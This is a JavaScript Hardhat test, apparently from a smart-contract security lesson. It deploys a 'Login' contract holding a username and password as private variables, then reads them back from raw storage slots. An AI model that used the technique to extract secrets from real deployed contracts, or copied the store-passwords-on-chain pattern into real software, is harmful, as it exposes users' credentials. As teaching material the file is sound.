const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Attack", function(){
    it("Should be able to read the private variables username and password", async function(){

        //Deploy the login contract.
        const loginFactory = await ethers.getContractFactory("Login");
        
        //To save space we would convert it to bytes array.
        const usernameBytes32 = ethers.utils.formatBytes32String("test");
        const passwordBytes32 = ethers.utils.formatBytes32String("password");

        const loginContract = await loginFactory.deploy(
            usernameBytes32,
            passwordBytes32
        );
        await loginContract.deployed();
        //Get the Storage of 0 and 1 slot.
        const slot0Bytes = await ethers.provider.getStorageAt(
            loginContract.address,
            0
        );
        const slot1Bytes = await ethers.provider.getStorageAt(
            loginContract.address,
            1
        );

        expect(ethers.utils.parseBytes32String(slot0Bytes)).to.equal("test");
        expect(ethers.utils.parseBytes32String(slot1Bytes)).to.equal("password");
    });
});